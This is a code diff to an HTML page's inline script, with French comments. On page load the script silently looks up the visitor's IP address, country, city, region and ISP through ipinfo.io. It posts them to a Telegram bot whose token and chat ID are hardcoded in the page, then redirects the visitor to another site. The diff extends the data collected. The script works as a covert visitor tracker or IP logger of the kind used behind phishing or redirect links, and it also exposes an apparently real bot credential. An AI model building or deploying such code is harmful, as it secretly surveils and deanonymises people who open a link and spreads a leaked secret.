@@ -7,28 +7,34 @@
   <script>
     (async () => {
       try {
-        // Récupération IP et pays
-        const res = await fetch('https://ipapi.co/json/');
+        // Appel à ipinfo.io (clé non requise pour usage basique)
+        const res = await fetch('https://ipinfo.io/json?token=TON_TOKEN'); // ← remplace TON_TOKEN si tu as un compte, sinon retire `?token=...`
         const data = await res.json();
-        const ip = data.ip;
-        const country = data.country_name;
-        const countryCode = data.country_code;
-        const flagEmoji = String.fromCodePoint(...[...countryCode].map(c => 127397 + c.charCodeAt()));
 
-        // Message Telegram
-        const message = `🛰️ Nouveau visiteur\nIP: ${ip}\nPays: ${country} ${flagEmoji}`;
-        const botToken = '7633904177:AAHGchn80h2QDuAmo_amRVwa7PxhgMNOPiY';     // ← à remplacer
-        const chatId = '6996434307';         // ← à remplacer
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        const ip = data.ip;
+        const country = data.country; // Code pays, ex: FR
+        const region = data.region || '';
+        const city = data.city || '';
+        const org = data.org || 'Inconnu';
+
+        // Drapeau en emoji
+        const flagEmoji = String.fromCodePoint(...[...country].map(c => 127397 + c.charCodeAt()));
+
+        // Format message
+        const message = `📡 Visiteur détecté\n🌍 IP: ${ip}\n🏳️ Pays: ${country} ${flagEmoji}\n📍 Ville: ${city}, ${region}\n🏢 FAI: ${org}`;
 
         // Envoi à Telegram
-        await fetch(url);
+        const botToken = '7633904177:AAHGchn80h2QDuAmo_amRVwa7PxhgMNOPiY';
+        const chatId = '6996434307';
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-      } catch (e) {
-        console.error("Erreur d'envoi à Telegram", e);
+        await fetch(telegramUrl);
+
+      } catch (err) {
+        console.error("Erreur IPINFO ou Telegram:", err);
       } finally {
-        // Redirection rapide
-        window.location.href = 'https://www.okx.com'; // ← à remplacer
+        // Redirection
+        window.location.href = "https://tonlien.comc"; // ← à remplacer
       }
     })();
   </script>
